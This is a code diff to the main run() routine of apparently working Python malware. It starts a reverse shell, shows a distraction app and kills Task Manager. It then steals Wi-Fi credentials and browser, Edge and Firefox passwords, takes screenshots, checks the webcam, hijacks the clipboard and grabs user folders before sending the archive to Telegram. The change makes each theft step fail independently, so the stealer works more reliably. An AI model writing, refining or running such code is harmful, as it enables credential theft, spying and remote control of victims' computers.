@@ -861,45 +861,56 @@ def run():
         threading.Thread(target=keep_reverse_shell_alive, daemon=True).start()
         launch_distraction_app()
 
-        try:
-            if not already_exfiltrated():
-                profile_system()
-                take_screenshot()
-                if check_webcam():
-                    with open(os.path.join(EXTRACT_FOLDER, "webcam.txt"), "w", encoding="utf-8", errors="ignore") as f:
-                        f.write("Webcam detected.")
-                extract_wifi()
-                detect_vm()
-                kill_taskmgr_once()
-                clipper()
-                extr_browser()
-                dump_edge_passwords()
-                extr_firefox_passwords()
-                grab_user_dirs() 
-                time.sleep(1)
+        if not already_exfiltrated():
+            # --- PROFILE & EXFILTRATION PHASE, each step isolated ---
+            for fn in (
+                ("profile_system", profile_system),
+                ("take_screenshot", take_screenshot),
+                ("check_webcam", lambda: check_webcam() and open(os.path.join(EXTRACT_FOLDER, "webcam.txt"), "w").write("Webcam detected.")),
+                ("extract_wifi", extract_wifi),
+                ("detect_vm", detect_vm),
+                ("kill_taskmgr_once", kill_taskmgr_once),
+                ("clipper", clipper),
+                ("extr_browser", extr_browser),
+                ("dump_edge_passwords", dump_edge_passwords),
+                ("extr_firefox_passwords", extr_firefox_passwords),
+                ("grab_user_dirs", grab_user_dirs),
+            ):
+                name, func = fn
+                try:
+                    func()
+                except Exception as e:
+                    with open(os.path.join(EXTRACT_FOLDER, "error.log"), "a", encoding="utf-8") as log:
+                        log.write(f"{name}() failed: {e}\n")
+
+            # pause, then send it off
+            time.sleep(1)
+            try:
                 send_zip_to_telegram()
-                mark_exfiltrated()
-        except Exception as e:
-            with open(os.path.join(EXTRACT_FOLDER, "error.log"), "a", encoding="utf-8", errors="ignore") as log:
-                log.write(f"profile/exfil phase failed: {e}\n")
+            except Exception as e:
+                with open(os.path.join(EXTRACT_FOLDER, "telegram_error.txt"), "a", encoding="utf-8") as err:
+                    err.write(f"send_zip_to_telegram failed: {e}\n")
+
+            mark_exfiltrated()
 
         fake_input()
 
+        # stay alive
         while True:
             time.sleep(10)
 
     except Exception as e:
-        with open(os.path.join(EXTRACT_FOLDER, "error.log"), "a", encoding="utf-8", errors="ignore") as log:
+        with open(os.path.join(EXTRACT_FOLDER, "error.log"), "a", encoding="utf-8") as log:
             log.write(f"run() fatal error: {e}\n")
-
-        # fall into infinite loop anyway
         while True:
             time.sleep(10)
+
 
 
 
 
 if __name__ == "__main__":
     run()
+
 
 
